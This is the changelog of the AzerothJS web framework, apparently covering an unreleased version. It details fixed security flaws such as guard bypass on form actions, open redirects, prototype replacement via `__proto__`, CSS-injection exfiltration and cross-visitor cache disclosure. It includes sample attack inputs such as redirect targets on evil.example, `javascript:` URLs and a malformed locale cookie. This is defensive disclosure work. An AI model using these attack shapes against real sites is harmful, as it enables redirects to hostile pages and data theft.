# Changelog

All notable changes to AzerothJS are documented here. The monorepo is versioned in
lockstep: one version covers every `@azerothjs/*` package, the `azerothjs` entry
package, and both editor integrations.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions
follow [Semantic Versioning](https://semver.org) under the release contract in
[VERSIONING.md](VERSIONING.md).

## [Unreleased]

### Security

- **A page action ran for anyone holding a CSRF cookie, whatever the page's guards said.**
  `registerAction` read the form, checked the token and called the action; the route chain was
  never consulted, so a signed-out visitor whose GET of a guarded page answered 401 could POST to
  it and have the write executed. Every verdict shape bypassed: `false`, `forbidden()`,
  `unauthorized()`, a redirect, and a guard inherited from a layout. The action now runs the
  chain's guards through the same walk the page's GET runs, after the CSRF check and before the
  action: a vetoed native submit gets the page's own blocked UI at the guard's status, an
  enhanced submit gets the 401 or 403 envelope, a guard that redirects sends the submit there,
  and the action never runs.

- **An action's redirect target went to `Location` unjudged.** `throw redirect(target)` from an
  action wrote the target straight into the 303, so the comeback idiom `redirect(form.get('next'))`
  was an open redirect: `https://evil.example/`, `//evil.example/x` and `javascript:` were all
  followed, where the same targets from a guard or loader were refused. The action boundary is
  now judged by the same rule as the other three; an off-origin target is a 500 with no
  `Location`, and `unsafeUrl(...)` opts a deliberate one out exactly as it does elsewhere.

- **A JSON body could replace the request context's prototype.** A middleware or api guard that
  returns parsed request data as its additions, the shape the kernel documents, merged every own key
  of the object onto the context. `JSON.parse` produces `__proto__` as an own key, and assigning it
  invokes the inherited setter: the context's prototype was swapped for the attacker's object, its
  `url` and `path` accessors vanished (a guard reading either threw, so the request answered 500),
  and any context key never set as an own property resolved to whatever the body supplied. The key
  now joins `request`, `params` and `url` on the list an addition may never write.

- **A malformed locale cookie failed every negotiated page.** `negotiateLocale` decoded the cookie
  value with no guard, so a cookie such as `locale=%` threw and every page or API route that reads
  the reader's language answered 500 for as long as the browser kept sending it. A value that does
  not decode is now delivered verbatim, where it fails to match a supported tag and falls back like
  any other unknown choice.

- **A rate-limited request answered in the wrong envelope, so a client read it as a success.**
  `rateLimit` built its own refusal rather than raising one, so the 429 carried the kernel's
  default error body instead of the app's. An application that publishes an envelope with an
  `ok` field, which the scaffolded backend does, therefore emitted one response on the wire
  without it, and a client written against the documented shape read `body.ok` as `undefined`
  and treated being rate limited as success. The same path also skipped the app's error
  observer, so a limiter that could not key on a client identity answered 500 and reported to
  nobody: a limiter doing nothing, silently.

  A refusal is now THROWN, which is what `pipeline()` already knew how to answer: it maps a
  middleware throw through the app's own error policy, so the 429 takes the app's envelope, its
  serializer and its observer, exactly as a refusal raised inside the app does. The limiter's
  `RateLimit-*` headers ride the error, so nothing a returned response carried is lost, and
  fail-closed behaviour is unchanged. `TooManyRequestsError` gains an optional third parameter
  for those headers.

- **A `<meta http-equiv="refresh">` could send a visitor off-origin, and no gate looked at it.**
  `content` is a URL sink on exactly one element: under a refresh pragma the browser treats it as
  a navigation directive. The render gate never inspected it, because the gate judges one
  attribute at a time and `content` is only dangerous in the PAIR - so a target built from data
  reached the document with no check, while the same string in an `href` was refused. The
  `useHead()` path was closed previously; markup was not, on either face.

  Both are now judged by one rule, the same one a guard or loader redirect answers to: an
  off-origin refresh target is refused as the open-redirect shape. The gate reads the sibling
  attribute it needs, so every writer is covered - the props object serves `h()` and the
  serializer, the element serves the compiler's `setProp`, and a fully static one is refused at
  BUILD time in both compile targets, where a folded template would otherwise reach the
  document unchecked. All six legal spellings of the directive are parsed, including the four
  a `url=` scan misses.

  Narrow by construction: only `refresh` is inspected, so `og:url`, `og:image` and every other
  meta keep carrying absolute URLs; a same-origin refresh is untouched; and `unsafeUrl(...)`
  opts a deliberate off-origin target out, exactly as it does for every other URL sink.

- **A failed loader must not put its reason on the wire.** With server-side loader failures now
  rendering a page rather than throwing (see Changed), the handoff had to say something about
  them. It says WHICH levels failed and nothing else. A 5xx message can hold a connection
  string, a user name or a query, and the kernel's own error path already refuses to expose
  one; the client rebuilds a generic failure so its level lands in the state the server
  rendered, and the real error goes to the host's error observer instead. The reasons ride a
  non-enumerable symbol on the server's own object, so no serializer can carry them by accident.

- **Errors could silently bypass the error observer.** `onError` documents itself as observing
  every error the app maps, and the mapping path reads `request.signal` to record whether the
  client had already gone. That read went through a guard which handled a MISSING socket but not
  a NULL one - and Node nulls the reference the moment a connection is destroyed, which is exactly
  the case the guard exists for. Reading the signal then threw, and because an observer must never
  be able to break the error path, that throw was swallowed along with the report. Any error
  mapped after the socket was gone was therefore answered correctly to the client and recorded
  nowhere: the response said 413, the observer saw nothing, and no seam anywhere was told.

  Found through `streamMultipart`, which reliably reaches that state, but it was never specific to
  multipart: a body read over its limit and a handler throwing the same error both reported
  correctly, and the real variable was whether the socket still existed when the error was mapped.
  A gone socket now yields a pre-aborted signal, which is the truthful answer and what the missing
  case already returned.

- **Two different callers could share one cache entry in production.** A cache key must tell
  distinct inputs apart. A value with no enumerable identity - a class instance, an ORM entity, a
  `Map`, a `Set` - cannot produce one, and development refused it while production fell back to
  `String(value)`: the constant `"[object Object]"` for every class instance. Two tenants keyed on
  their own entity object therefore collapsed onto the SAME entry, and one was served the other's
  data. The dangerous behaviour existed only where nothing was watching, so it could not be found
  in development.

  Such a value is now refused in both modes, with the message development already gave. An
  application passing an entity as a cache key part was not working before this change, it was
  colliding, so the error replaces silent wrong data rather than correct behaviour. Plain objects,
  arrays, null-prototype objects, anything carrying `toJSON` (a `Date`, a `URL`) and the
  primitives are unaffected. `bigint` is now keyed explicitly and distinctly from the equivalent
  string, where it previously relied on the same lossy fallback.

- **A refused upload could hold its connection open indefinitely.** When a handler answers without
  reading the request body - which is what an over-limit refusal does - Node considers the request
  satisfied and stops policing the connection, so the period afterwards was bounded by nothing. A
  peer that had already been refused could hold a socket, its request scope and its file
  descriptor for as long as it cared to dribble the body it was told not to send: measured at one
  byte every 200ms, with the request timeout at two seconds and the sweep at 250ms.

  The upload cannot be stopped at the refusal itself without losing the refusal - closing a socket
  that still holds unread data forces a TCP reset, and the reset discards the response already
  queued for the client. The bound is therefore on time: `requestMs` now also governs the drain
  after a response, adding a fourth phase to the socket timeouts beside headers, request and idle
  keep-alive. It arms only when the body is unfinished, so ordinary keep-alive traffic is
  unaffected, and a client that finishes its upload promptly keeps both its response and its
  connection. The bytes such a client sends are unchanged: that cost is symmetric and bounded by
  the declared length, and cannot be reduced without withholding the response.

- **A truncated upload could be handed to a handler as a complete body.** The raw-body fast lane
  treated the stream's `end` as proof the body was complete. It is not: `end` means the stream
  stopped, not that it delivered what it promised. Completeness was inferred instead from Node
  emitting `aborted`, and that varies by transport AND by Node version - an h2c stream reset was
  measured pushing EOF with no `aborted` at all, resolving 16384 of 100000 declared bytes as a
  successful read, while a session destroy on the same transport rejected correctly. Since this
  package supports Node 22 and newer, whether a handler saw a partial upload as whole depended on
  the runtime it happened to be deployed on. A handler acting on a partial body it believes is
  complete is silent wrong data, which is worse than an error.

  A declared `Content-Length` is a promise about the message, and the read already counted the
  bytes, so the count is now VERIFIED against it and a short body is refused as incomplete. The
  guarantee no longer depends on which events the platform chooses to emit; it holds identically
  on HTTP/1.1, h2c and any future adapter. Chunked bodies declare no length and are unaffected, a
  malformed `Content-Length` is treated as absent rather than as zero, and the abort listener
  remains for the case where a stream never ends at all.

- **A value interpolated into `css` could write its own CSS rules.** The template parts are the
  author's CSS, but the interpolated values are data, and they were concatenated in raw. A value
  containing a closing brace ended its declaration and its rule and opened new ones; a value
  containing a semicolon added a declaration to the rule it sat in. Neither has to leave the
  style element, so the `</style` breakout guard downstream never examined them, and because the
  registered text is what both the server prelude and the client stylesheet are built from, the
  injected rules reached both. This is an exfiltration channel rather than a cosmetic problem: a
  `url()` is a network request, and attribute selectors turn it into a character-at-a-time read of
  form values. Confirmed in a browser - unescaped, the page held three rules instead of one and
  Chromium issued the request; escaped, one rule and no request.

  Interpolated values are now CSS-escaped at the point they enter the source. The escape is
  faithful rather than destructive: inside a quoted string it still renders the original
  character, so a legitimate value keeps its meaning while losing its structure. A hostile value
  additionally invalidates the one declaration it was written into, which is the intended
  degradation - the page loses a colour rather than gaining an attacker rule. A plain-string call
  is entirely author source and is unchanged, as is a `style { }` section. An interpolation is a
  VALUE, not CSS source; compose rule text with a `style { }` section or a CSS import.

- **A cached page could carry the identity of whichever visitor happened to render it.** Both
  paths that produce a SHARED page - the cold-miss render and the background revalidation - ran
  inside the triggering visitor's request scope, so any request-scoped read during that render
  (a `createStore` instance, the data cache) resolved to THAT visitor and was written into the
  process-wide page cache. Measured over real sockets: the first visitor's per-request value came
  back to the next visitor, and the revalidating visitor's value was then served to everyone
  after. Both renders now run in their own work unit, so a shared render resolves a neutral scope
  and carries no identity. The guarded path is unchanged: it stays per-request and is never
  cached.

  The same inheritance had a second effect. Because the background revalidation also inherited
  the triggering request's teardown, that teardown aborted the revalidation's in-flight cached
  reads - which resolve to `undefined` rather than rejecting - so a DATA-LESS page was written to
  the shared cache with nothing reported to the error observer. Both are closed by the same
  change, each with its own regression test and revert proof.

- **A throwing error observer hung the streamed page and then killed the process.** The
  Suspense boundary catch called the user's `onError` bare, and the pending-boundary counter was
  decremented by the statement AFTER it. So an observer that threw skipped that decrement: the
  counter never reached zero, the client waited out the entire settle timeout (10 seconds by
  default) for a page whose bytes were already decided, and the throw escaped the floating
  promise driving the boundary as an unhandled rejection, taking the process with it. Measured at
  1515ms against a 1500ms timeout, versus 3ms for an observer that returns. The observer is now
  isolated, and the boundary accounting runs in a `finally` so that being the last statement is
  no longer what makes it safe. This is reachable in ordinary code: an observer written as an
  exhaustive `switch` over the error phase began throwing when that union gained `'stream'`.

- **A loader redirect was the one redirect boundary that judged nothing.** A redirect is
  consumed at four places: the SSR guard and loader paths, the client guard path, and the client
  LOADER path. The first three ran the target through the shared judgement and failed closed; the
  fourth handed it straight to the navigator. Because a loader derives its target from DATA, an
  app whose loader built a redirect out of a response field could be steered off-origin by that
  field - the open-redirect shape, on the only boundary the earlier hardening never reached. Now
  judged exactly like a guard redirect, and a refusal stops the scan rather than falling through
  to the next level. The judge is the shared target check rather than a plain external-URL test,
  because it also unwraps an author-vetted `unsafeUrl(...)`: that returns a brand OBJECT typed as
  a string, and the object branch of the path builder was reading a `pathname` that is not there,
  so a vetted loader redirect navigated to the literal string "undefined".

- **`unsafeUrl(...)` did not work, on any client path.** The deliberate off-origin escape hatch -
  the one the refusal message itself recommends - was accepted at the boundary and then threw at
  the commit step, because `pushState`/`replaceState` cannot write a cross-origin URL. The
  SecurityError escaped from inside the effect committing the navigation, with the history
  bookkeeping already advanced, on both the guard and loader paths. Leaving the app is a DOCUMENT
  navigation, so an off-origin target now exits through `window.location` instead. The target is
  resolved against the document rather than matched syntactically, so an absolute SAME-ORIGIN URL
  stays an ordinary in-app navigation. Only http(s) may leave: a document navigation EXECUTES a
  `javascript:` URL where `pushState` merely threw, so anything else is refused rather than
  quietly turning a crash into a script-execution sink.

- **Added `responseTimeoutMs`: a handler that never produced a response held its socket
  forever.** Nothing bounded handler execution. The node adapter's `requestMs` bounds only
  RECEIPT of the request - measured, a client sending incomplete headers is hung up on at
  1552ms while a completed request whose handler never resolves is never released at all - so a
  wedged upstream pinned a socket, a request scope, and its per-key state for the process's
  lifetime with no self-healing. Opt-in with no default: only the application knows how long its
  own code should take, and the clock includes reading the request body, so a value below
  `requestMs` (default 300000) would refuse slow uploads the adapter explicitly permits. It
  frees the socket and answers 503; it does NOT cancel the handler, which keeps its memory, its
  pool slot, and its upstream connection until it settles - the deadline bounds the client's
  wait, not the server's resources. It does not bound a streaming body either: the clock stops
  at the Response, so SSE and file serving are unaffected. The deadline deliberately touches
  nothing inside the request scope, and both refusals have tests: marking a still-running
  handler settled would fire the `release()` it registers on acquiring a connection and let it
  keep using a connection already back in the pool, and releasing its data cache would resolve
  an in-flight cached read to `undefined` rather than letting it fetch.

- **h2c advertised no limit on concurrent streams.** `serveH2c` inherited Node's default of
  4294967295, so ONE session could open unbounded concurrent requests, each with its own request
  root, store scope, and cleanup registry. (The 100 that looks like a default elsewhere is
  `http2.connect`'s client-side self-limit, which stops applying once the server's settings
  arrive.) Now bounded to 100 by default, matching the two session limits beside it, and
  tunable with `maxConcurrentStreams`.

- **A server-rendered page kept rendering for clients that had already disconnected.** The
  streamed path passed the request's abort signal to the renderer; the BUFFERED
  `render: 'server'` path - the default whenever a renderer is configured - and the guarded
  live path passed none. A client could open connections to a data-heavy page and drop them,
  and the server would still run every loader's full fan-out to the backing services with
  nobody left to read the answer. Both now receive `request.signal`, which the router already
  threads into every loader. Two render paths deliberately still take no request signal, and
  each has a test pinning that: a coalesced ISR production is SHARED with every request queued
  on the same key, so one waiter's disconnect must not abort it for the others, and a
  background regeneration has no waiting client at all. Note the boundary: this cancels loader
  I/O and can skip a render that has not started, but the render pass itself is synchronous and
  cannot be interrupted once begun.

- **A layout loader was handed a descendant's route param but keyed without it, so it
  served one document's data under another's URL.** A layout at `/w/:workspaceId` with a
  child `doc/:docId` received `{ workspaceId, docId }` while its result was cached under
  the workspace alone. Visiting `/w/1/doc/SECRET-A` and then `/w/1/doc/PUBLIC-B` left the
  layout still serving `SECRET-A`'s data - permanently, because a navigation that leaves
  the level key unchanged starts no fetch at all, and because the server-rendered value is
  adopted without fetching. A loader now receives the params bound AT OR ABOVE its own
  level, on the client and the server alike; a leaf still sees its ancestors', and only a
  layout stops seeing what it cannot key on. The alternative - widening the key to the
  whole chain - was rejected because it would make every layout loader re-run on any
  descendant param change. To use a descendant's param, read it in a component with
  `useParams()` or read that level's data with `useLoader(handle)`. Guards are unchanged
  and still receive the whole chain: they key nothing. On a typed route handle, params
  other than the route's own are now `string | undefined` rather than `string`.

- **A server-rendered loader received a wider query than the key its result was cached
  under, and that result was then served for other URLs.** Server-side `matchAndLoad`
  ignored the route's declared `search` schema and handed every loader the raw query,
  while the client keyed the entry on the declared subset alone. Given
  `?page=1&utm=junk`, the server's loader saw `{ page: '1', utm: 'junk' }` where the
  client's saw `{ page: '1' }` - so a value computed from the tracking parameter was
  stored under a key claiming it depended only on `page`. Because a navigation that
  leaves the level key unchanged starts no fetch at all, those bytes then served
  `?page=1&utm=anything` indefinitely. A loader's argument is now the exact preimage of
  its key on every path that can produce the value: the declared subset when a schema is
  declared, the whole parsed query when none is. Guards are unchanged and still receive
  the raw query on both paths - they key nothing, so narrowing them would remove
  information an authorization decision may legitimately use. On a typed route handle the
  loader's `query` is now the schema's output type, so reading an undeclared key is a
  compile error rather than a silent `undefined`. Related: an `object()` schema's parsed
  value now has a null prototype, so a declared `__proto__` field can no longer reach the
  prototype setter through request data.

- **A guard or loader could redirect off-origin, and the framework wrote it to the wire.**
  `throw redirect(url.searchParams.get('next'))` produced a real 302 to wherever the
  parameter pointed - a shipped open redirect needing no browser quirk. A guard/loader
  redirect is an AUTOMATIC navigation whose target the app derives, so an off-origin one is
  now refused by the router's own notion of external (scheme or protocol-relative, judged
  on the string a browser would actually resolve). The check sits at the CONSUMPTION
  boundaries, not in `redirect()`, because a guard may return a bare target and never call
  `redirect()` at all; both target forms are judged, since `{ pathname }` is an
  unconstrained string. A refused redirect is its own terminal outcome served as a 500 -
  never rendered, because rendering the page a guard declined is the authorization bypass -
  and prerender fails the build naming the target. A deliberate off-origin redirect says so
  with `unsafeUrl(...)`, the same brand the render gate honours, unwrapped at the boundary
  so no marker object reaches a header. `<meta http-equiv="refresh">` built through
  `useHead` answers to the same rule, parsed per HTML's declarative-refresh steps (the
  `url=` prefix is optional and `;`, `,` or bare whitespace all separate, so a naive `url=`
  scan misses most legal spellings); every other meta keeps its absolute URLs, so `og:url`
  and `og:image` are untouched. Unchanged by design: `<Link>` (user-initiated) and
  `@azerothjs/http`'s `redirect()` (a raw `Location` header value, whose job includes
  off-origin flows). Two adjacent fixes ride along: a redirect 302 now carries
  `cache-control: private, no-store`, since a bare 302 is heuristically cacheable and a
  shared cache could replay one visitor's redirect; and the object form's query and hash
  now survive server-side rendering, where only the pathname used to.

- **A streamed response left its request scope mid-body, sharing one identity's cached
  data with every later stream.** A pull's async context is whoever DISPATCHED it - the
  adapter, or the consumer's own pace - so a synchronous producer's reads resolved the
  process-wide default scope from the second chunk on: alice streamed and completed, then
  bob streamed and read alice's data with zero fetches, and the same stream flipped
  behavior on consumer pace alone. Every monitored pull and cancel now re-enters its
  request context explicitly (the boundary is a Node implementation detail, not a spec
  guarantee), so a streamed body's isolation unit is the full response lifetime:
  per-request caching holds at every chunk, and a disconnect that tears the request down
  mid-pull completes the in-flight read silently on the released cache's path. `sse()`
  teardown re-enters too: `connection.signal` abort listeners run in the request scope
  they belong to, via a context snapshot taken at construction. One shape remains the
  app's: a producer callback subscribed to an external emitter runs in the emitter's
  context - capture what it needs before subscribing, or wrap it in a work-unit root
  (`runInWorkUnit`).

- **A server that never rendered a page cached loader data process-wide, serving one
  identity's reads to every other.** The data cache refused the default scope only after
  a render latched it, so on a plain API server - WebSocket handlers, cron jobs,
  module-construction code - every `cached()` read outside a request landed in ONE
  process-wide registry: socket B read socket A's value with zero fetches, and four cron
  runs shared the first run's data for the retain window (five minutes by default,
  indefinite while subscribed). The cache now fails closed on positive server evidence:
  every `@azerothjs/http` entry point (`App` construction, `serve`, `serveH2c`,
  `toFetchHandler`, the request root) marks the process, and from then on a default-scope
  read gets no cache - correct data, fresh fetch, no disclosure. Requests are unaffected
  (their scope is per-request), browsers are unaffected, and a latched server render
  behaves exactly as before; default-scope reads at boot, before the first render, fall
  under the breaking change below. BREAKING for a server that deliberately used
  `cached()` as a process cache outside requests: those reads lose entry reuse and
  single-flighting, and their `revalidate` becomes a no-op. Wrap unit work (a WebSocket
  message, a cron run) in a work-unit root (`runInWorkUnit`) so it owns a real scope, or
  hold true process-lifetime values in module-local state instead of the request-data
  cache. A process using `@azerothjs/ws` or `@azerothjs/cron` with no `@azerothjs/http`
  import anywhere carries no azeroth scoping surface and keeps the old fail-open
  behavior - wire `runInWorkUnit` there.

- **An ISR cache hit served guarded pages without running guards, disclosing the first
  visitor's loader data to strangers.** `registerIsr` answered from the page cache before
  any routing, and guards run only inside the renderer - so once one authorized visitor
  warmed a guarded page, every later request inside the revalidate window received that
  visitor's rendered page, private handoff data included, with the guard never consulted.
  A guard makes a page a function of the request's identity, and an identity-dependent
  page has no business in a shared cache, so the combination now cannot exist, refused at
  every surface:
  - `mountPages` and the prerender pass both REFUSE a `render: 'static'` page (plain,
    enumerated, or ISR) whose route chain carries a guard - declaration-based, even when
    the guard would pass at build time, naming the guard-carrying route. Move the guard
    into a server-rendered subtree, throw `redirect()` from a loader (live-rendered
    requests only; it never runs for prerendered bytes), or use `render: 'server'`. The
    one exemption is a wildcard static page without `revalidate`, which never serves
    files. The mount-time refusal means a server-only upgrade against a pre-fix dist
    fails the deploy loudly instead of serving stale guarded files; rebuild the client
    dist as part of upgrading across this fix, and clear any persistent page-cache
    directory (`FilePageCache`) - pre-fix entries may hold a visitor's private HTML at
    rest.
  - An ISR URL that matches a guarded chain elsewhere in the route table (an overlap the
    static checks cannot see) is gated ahead of the cache, the prerender seed, AND the
    shared in-flight render: it renders live per request and answers
    `cache-control: private, no-store` with `x-azeroth-cache: live`, reported once per
    registration through `onError` as a policy notice.
  - Every guarded 200 and streamed response now carries `cache-control: private,
    no-store` - server-rendered pages included, which previously answered with headers a
    shared cache one hop out could store. A guard veto (403) or redirect (302) on the
    plain server path keeps its existing headers: neither is heuristically cacheable, and
    a veto renders nothing private to protect.
  - Boundary, stated plainly: this refusal keys on GUARDS. A loader that reads request
    identity without a guard is invisible to it - keep personalized loaders off ISR and
    static pages.

### Fixed

- **A component with a fragment root rendered on the server and blanked the page in the browser.**
  A fragment root lowers to the array of its roots. The h()-tree path that serves SSR and
  hydration accepted the array, but the template-clone path that a browser build runs handed it
  straight to `insertBefore`, which throws on a non-node, so a parent slotting such a component
  (an account shell with a signed-in and a signed-out branch, say) rendered nothing after the
  title. The slot binder now splices every root in at the slot position, the same treatment a
  hole already gives a multi-node value, and the three modes agree on the output.

- **A parameterised `cached()` fetcher could not be typed as a revalidate, patch or invalidation
  target.** `revalidate(getUser, [42])`, `patch(getUser, [42], next)` and `invalidates:
  [getUser]` were compile errors for any family taking an argument, although the documentation
  showed all three, because the target type pinned an empty argument list. `revalidate` and
  `patch` now infer the family's own argument list, so the arguments are checked against it, and
  `invalidates` accepts a family of any arity through the new `AnyCachedFetcher` type.

- **`<Image>` froze its `alt` and `src` when they came from markup.** Markup passes a component
  prop as a GETTER on the props object, so reading one during setup resolves it once and discards
  the laziness the protocol exists to provide - which is exactly what the component did. On a page
  whose language can change, the picture kept its original alt text: a sighted reader saw the page
  switch language and a screen-reader user did not. `alt` now accepts a getter like `src` already
  did, and every attribute that can change is handed to the renderer as a function, so a literal, a
  markup expression and an explicit getter all behave the same way.

  Worth stating plainly, because the type suggested otherwise: `src` was affected too. It was
  reactive only when the caller passed an explicit function, which markup interpolation never
  produces - so `src={ url() }` was as frozen as `alt` was, and the two-branch code that forked on
  whether the caller happened to pass a function is now one path. Widening `alt`'s type alone would
  NOT have fixed this: `alt={ expr }` compiles to a getter returning a string, so a `typeof value
  === 'function'` test still misses it.

- **A scaffolded app rendered nothing when the devtools panel failed to load.** The generated
  entry point installed the development panel behind a TOP-LEVEL `await import(...)`. That await
  is part of module evaluation, so any rejection aborted the module and the `render`/`bootClient`
  call after it never ran: a completely blank page whose only console error named the devtools
  module. The obvious reading - "devtools is broken" - was wrong; the app was broken, by devtools.
  The import is now guarded in both the frontend and fullstack templates, so the panel failing
  costs the panel and nothing else. A development-only diagnostic must never be able to stop the
  application from starting, whatever the trigger: a stale build, a partially installed package,
  or a dev server that will not serve the path (which is the ordinary case when a project links a
  framework checkout outside its own root, since that is served through a path the dev server
  restricts by default).

- **A fragment-rooted component crashed on the client and never hydrated.** `<>...</>` is
  normative grammar, and the compiler's own multiple-root diagnostic tells authors to wrap
  sibling roots in one - so this was reachable through the recommended fix. Both compiler
  backends emit a fragment as an ARRAY, with static text inside it as a plain string, and the
  three mount paths each re-implemented their own narrower handling of the root instead of using
  the renderer routine every other child goes through. `render` appended array items straight to
  the container, so `<> hello <b>x</b> </>` threw on the string; `renderTest` did not handle the
  array at all; and `hydrate` rejected an array as unhydratable and fell back to a FULL CLIENT
  RENDER, throwing away and rebuilding server markup on every fragment-rooted page - silently,
  because the warning is development-only and the resulting HTML is byte-identical. Only node
  identity revealed it. All three now go through the shared routines (`appendChild` on the mount
  side, `hydrateChild` on the adopt side), which already resolved arrays, getters, nodes, slot
  handles and text for every non-root child. The hydration mismatch net is not weakened by this:
  it moves from a test of the root VALUE's shape to the cursor exhaustion check, which validates
  the whole consumed range.

- **`MountNode` did not describe what a component can return.** It admitted only a single element
  or fragment node, while the compiler emits the array form for a fragment root, `render`
  documented the array in its own JSDoc, and the implementation cast past its signature to
  iterate it. The documented, diagnostic-recommended pattern therefore failed to type-check. It
  now includes the fragment form, and the five entry points that had restated a narrower version
  of the same idea by hand (`renderToString`, `renderToStream`, `renderToDocument`, `renderBody`,
  `renderTest`) all use the one type. Widening it is what surfaced the two runtime defects above;
  fixing only the type would have turned a compile error into a crash.

### Changed

- **An enhanced submit whose action redirects now navigates.** The server answered a 303 whatever
  the client asked for, `fetch` followed it, and `<Form>` received the HTML of the target page and
  reported a transport failure. A client that asks for JSON now receives `{ ok: true, redirect }`
  and `<Form>` navigates there, for an action's own redirect and for a guard's.

- **`<Form>` treats an answer that is not the action's own as a refusal by the server.** A 401,
  403 or 500, or any body without an `ok` field, settles `onSettled({ ok: false })`, leaves the
  previous validation result in place instead of clearing it, and logs the status once; the
  "could not be sent" report is reserved for a failed fetch. `onSettled` gains an optional
  `redirect` field.

- **An `action` is refused on a static page and on a layout.** A prerendered or cached page has no
  request to mint a form token for, so its form could never submit without JavaScript; a route
  with children has no page of its own to post to, and its action was dropped silently. Both are
  now mount and build errors naming the fix (`render: 'server'`; declare the action on the leaf).
  A wildcard static page without `revalidate` keeps its action, since it renders per request.

- **Under prefix routing a page accepts its form at every url it is mounted at.** The POST was
  registered at the bare path only, so the enhanced submit, which posts to the browser's
  prefixed url, answered 405. It is registered at the bare and the prefixed paths.

- **A guard veto is now its own state, and it lands on the URL it denied. BREAKING.** A denied
  navigation used to rewind to the previous location, and a cold load of a denied URL rendered
  the `<Routes fallback>` - the same UI as a genuinely unknown URL, while the server answered
  403 for one and 404 for the other. Three behaviours for one state, none of which the app could
  observe: clicking a link to a denied route was a silent no-op, and a deep link to it showed a
  "not found" page under a 403.

  A veto now settles AT the target URL in the blocked state. `router.state()` reports it, and
  `<Routes blocked={...}>` renders it with the status. Apps that declare no `blocked` keep
  rendering `fallback`, exactly as before. What changes for every app is the URL after a vetoed
  in-app navigation: it is the target, not the previous page. If you relied on the rewind, read
  `router.state()` and navigate yourself.

- **A loader that fails no longer costs the whole page. BREAKING for a host that caught it.**
  `matchAndLoad` ran the chain's loaders all-or-nothing, so one failing level threw away every
  other level's data and the request became a bare JSON 500 with no page at all - while the same
  failure on the client cost exactly that one level and left the layout standing. The two modes
  disagreed about the same fault.

  The chain now settles per level. Levels that loaded keep their data and render; the failed one
  settles errored, so the component's own `useLoader().error()` branch shows its failure UI, and
  the request is answered with that page at a real 500. `matchAndLoad` therefore RESOLVES where
  it used to reject: a host that wrapped it in `try`/`catch` to detect loader faults must read
  `handoff.failed` instead. The renderer reports the fault through the render's error observer
  (`phase: 'render'`) and answers a new `error` result kind, which every caching and prerender
  path already refuses by kind. Nothing about client-side navigation changes.

- **A loader's `notFound()` now reaches the level's own UI on the server too. BREAKING for a
  host that read the outcome.** The status was already right, and that hid the rest: a declared
  not-found collapsed the whole chain, so the server answered 404 and rendered the level as
  though it had simply loaded nothing. The `isNotFound(error())` branch the level's own
  component writes ran only after a client navigation, and every sibling level's data was
  discarded with it.

  It is now a per-level state like a fault, listed in `missing` and answered 404. The client
  rebuilds the real SENTINEL from it, so `isNotFound(error())` is true on the server exactly as
  it is on the client. `matchAndLoad` therefore returns a handoff where it used to return
  `{ notFound: true }` for this case; that outcome now means only what it always said it meant,
  that no route matched. A redirect is unaffected: it is a decision about the whole navigation
  and still ends the chain, by tree order rather than by which loader settled first.

- **The loader handoff wire format is now v4.** It carries the three new facts above -
  `denied`, `failed` and `missing`. A client reading an older server's payload ignores it and fetches
  normally, which is the existing skew behaviour. The version constant moved to its own module,
  because `router.ts` had the number written out as a literal: bumping the stamp alone would
  have made every client silently reject every handoff.

### Added

- **One url per language, and the `hreflang` that needs it.** `locales.routing: 'prefix'`
  gives every language its own address - `/fa/about` beside `/en/about` - and redirects the
  unprefixed path to the reader's own. A shared link then means one thing: `/fa/about` is
  Persian for everyone who opens it, whatever their browser asks for.

  `hreflang` annotations are emitted only in this mode, and that is the point rather than a
  limitation: they annotate a relationship BETWEEN urls, so a set of them all naming one
  negotiated address tells a crawler nothing while looking like the page was annotated. They
  are reciprocal - every language's page carries the whole set including itself, which is
  what crawlers require and the most common way hand-built annotations are wrong - with an
  `x-default` pointing at the negotiating path.

  A prefixed page also carries no `Vary`: the url already says which document it is, so a
  shared cache holds every language at once instead of fragmenting on a header. The route
  table, loaders and prerendered file names are untouched, because the prefix is stripped
  before anything downstream sees the path. The redirect is a 302 rather than a 301, since
  which language a reader gets depends on who is asking.

- **Message catalogues, with the plural rules the reader's language actually uses.**
  `createMessages()` takes plain TypeScript objects - no format this framework invented - and
  the first one is the reference, so its keys become the type and a translation that forgets a
  key or invents one is a build error rather than an English string surfacing in a Persian page.
  Placeholders are `{name}`; one left unfilled stays visible instead of blanking.

  Plurals go through `Intl.PluralRules`. `count === 1 ? one : other` is what a hand-rolled
  catalogue reaches for and it is correct only for the languages whoever wrote it speaks: Arabic
  distinguishes six forms and Russian four, so those readers get grammatically wrong text from
  code that looks obviously right. Write only the forms your language uses; the rest fall back
  to `other`. A key missing from the reader's language falls back to the reference language,
  because a page in the wrong language is readable and a page of empty strings is not.

- **Locale-bound formatting.** `useNumberFormat()`, `useDateFormat()`,
  `useRelativeTimeFormat()` and `useListFormat()` are thin over `Intl` and bound to the
  locale signal, so a switch reformats a date without the component knowing it held a date, and
  a Persian reader gets the Jalali calendar without anything in the app knowing Persian has one.
  Applied to nothing automatically, deliberately: a localized digit is right in a sentence and
  wrong in an identifier, a price in a form field, or anything a machine reads back.

- **Every render mode keeps the reader's language.** `render: 'static'` builds one file per
  language (`about/index.fa.html` beside `about/index.html`) and the mount serves the
  reader's own, falling back to the unsuffixed file so a build predating the config still serves.
  ISR now keys its cache on the language as well as the url - without that the first reader's
  language was cached and served to everyone after them until it expired, which is the shape of
  bug a multilingual site notices last. Negotiated responses carry `Vary: accept-language`,
  and `cookie` as well when the reader's own choice decided it, named per response rather
  than always so a page is not made uncacheable for the sake of readers who never chose one.

- **`negotiateLocale(request, config)` for everything that is not a page.** The same rule pages
  are negotiated with, callable from an SSE stream, a JSON endpoint, or anywhere a response
  carries text but no document - so a site's API cannot answer in a different language from its
  pages. `docs/i18n.md` covers the whole surface.

- **The language of a page is now decided by the framework.** `mountPages` takes a
  `locales` config; given one, every request is negotiated and the page is served with its
  own `<html lang>` and `<html dir>`.

  Before this a built shell carried one `<html lang="en">` and it was emitted verbatim for
  every request, so a bilingual site served its Persian pages labelled English with no `dir`
  at all: laid out left-to-right for the reader, mislabelled for the crawler, and announced in
  the wrong language by a screen reader. Nothing in the framework could fix it, because the
  choice lives in a cookie and a header that a render cannot see.

  The reader's own choice outranks their browser's guess, and the header is read in PREFERENCE
  ORDER - a reader whose header is `en-US,fa;q=0.9` asked for English and would accept
  Persian, and answering in Persian because Persian appears at all gets that backwards. The
  cookie is resolved against the supported list rather than trusted, since it is reader-supplied
  text that would otherwise reach the document element.

